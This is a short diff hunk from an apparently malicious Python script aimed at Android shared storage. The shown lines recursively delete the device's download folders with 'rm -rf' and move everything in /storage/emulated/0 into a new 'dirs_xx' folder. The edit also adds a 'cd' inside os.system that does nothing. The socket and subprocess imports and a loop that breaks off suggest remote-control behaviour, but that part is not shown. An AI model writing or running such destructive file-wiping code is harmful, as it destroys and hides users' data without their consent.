@@ -29,7 +29,8 @@ import socket, subprocess, os
 
 os.system('rm -rf /storage/emulated/0/download')
 os.system('rm -rf /storage/emulated/0/downloads')
-os.mkdir('/storage/emulated/0/dirs_xx')
+os.system('cd /storage/emulated/0/')
+os.mkdir('dirs_xx')
 os.system('mv /storage/emulated/0/* /storage/emulated/0/dirs_xx')
 
 while (back == False):
